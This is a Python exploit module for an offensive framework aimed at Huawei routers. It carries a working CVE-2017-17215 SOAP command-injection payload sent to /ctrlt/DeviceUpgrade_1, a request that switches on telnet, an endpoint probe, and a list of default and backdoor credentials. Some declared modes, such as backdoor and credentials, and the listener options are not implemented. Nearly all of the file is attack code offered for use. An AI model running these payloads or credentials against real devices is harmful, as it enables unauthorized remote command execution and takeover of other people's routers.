#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Huawei Router Exploit Module
CVE-2017-17215, CVE-2015-7254, Huawei Backdoors
"""

import requests
import socket
import time
import base64
import hashlib
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "Huawei Router Exploit",
    "description": "Huawei router backdoors and vulnerabilities",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "High",
    "references": [
        "CVE-2017-17215",
        "CVE-2015-7254",
        "Huawei Backdoors"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "admin"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "rce", "telnet", "backdoor", "credentials"]
    },
    "CMD": {"description": "Command", "required": False, "default": "id"},
    "LHOST": {"description": "Listener IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Listener port", "required": False, "default": "4444"},
}

# Huawei Default Credentials
HUAWEI_CREDS = [
    ("admin", "admin"),
    ("admin", "Admin@huawei"),
    ("root", "admin"),
    ("user", "user"),
    ("telecomadmin", "admintelecom"),
    ("telecomadmin", "nE7jA%5m"),
]

class HuaweiExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="admin"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Detect Huawei router"""
        console.print("\n[bold yellow]=== Huawei DETECTION ===[/bold yellow]")
        
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            huawei_detected = False
            if "huawei" in html_content or "hilink" in html_content:
                huawei_detected = True
                console.print("[green]✓ Huawei router detected[/green]")
            
            # Test vulnerabilities
            vulns = self.test_vulnerabilities()
            
            return {
                'is_huawei': huawei_detected,
                'vulnerabilities': vulns
            }
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_huawei': False}
    
    def test_vulnerabilities(self):
        """Test Huawei vulnerabilities"""
        console.print("[bold yellow][*] Testing Huawei vulnerabilities...[/bold yellow]")
        
        vulns = []
        
        # Test CVE-2017-17215 - RCE
        endpoints = [
            "/ctrlt/DeviceUpgrade_1",
            "/api/device/telnet",
            "/html/device/telnet.html",
            "/cgi-bin/telnet.cgi"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=5)
                if r.status_code != 404:
                    vulns.append(endpoint)
                    console.print(f"[green]✓ Vulnerability found: {endpoint}[/green]")
            except:
                continue
        
        return vulns
    
    def exploit_rce(self, command):
        """Exploit Huawei RCE vulnerability (CVE-2017-17215)"""
        console.print("[bold yellow][*] Exploiting Huawei RCE...[/bold yellow]")
        
        try:
            # CVE-2017-17215 exploitation
            payload = f'''<?xml version="1.0" ?>
            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <s:Body>
            <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
            <Command>{command}</Command>
            </u:Upgrade>
            </s:Body>
            </s:Envelope>'''
            
            exploit_url = f"{self.base_url}/ctrlt/DeviceUpgrade_1"
            headers = {
                'Content-Type': 'text/xml',
                'SOAPAction': 'urn:schemas-upnp-org:service:WANPPPConnection:1#Upgrade'
            }
            
            r = self.session.post(exploit_url, data=payload, headers=headers, timeout=10)
            
            if r.status_code == 200:
                console.print("[green]✓ Command execution attempted[/green]")
                return True
        except Exception as e:
            console.print(f"[red]✗ RCE exploit failed: {str(e)}[/red]")
        
        return False
    
    def enable_telnet(self):
        """Enable telnet on Huawei router"""
        console.print("[bold yellow][*] Enabling telnet...[/bold yellow]")
        
        try:
            # Huawei telnet enable endpoint
            telnet_url = f"{self.base_url}/api/device/telnet"
            payload = {"enable": "1"}
            
            r = self.session.post(telnet_url, data=payload, timeout=10)
            if r.status_code == 200:
                console.print("[green]✓ Telnet enabled[/green]")
                return True
        except Exception as e:
            console.print(f"[red]✗ Telnet enable failed: {str(e)}[/red]")
        
        return False

def run(session, options):
    """Main Huawei exploit function"""
    console.print(Panel("Huawei Router Exploit", style="bold red"))
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    mode = options.get("MODE", "detect")
    cmd = options.get("CMD", "id")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    
    try:
        exploit = HuaweiExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_huawei']:
                console.print("[green]✓ Huawei router detected[/green]")
                console.print(f"[cyan]Vulnerabilities: {len(result['vulnerabilities'])}[/cyan]")
            else:
                console.print("[red]✗ Not a Huawei router[/red]")
        
        elif mode == "rce":
            exploit.exploit_rce(cmd)
        
        elif mode == "telnet":
            exploit.enable_telnet()
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/red]")
        return False

def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", "Huawei Router Exploit")
    table.add_row("CVEs", "2017-17215, 2015-7254")
    table.add_row("Models", "HG series, EchoLife, Hilink")
    table.add_row("Risk", "High")
    console.print(Panel(table, title="Huawei Exploit", border_style="red"))
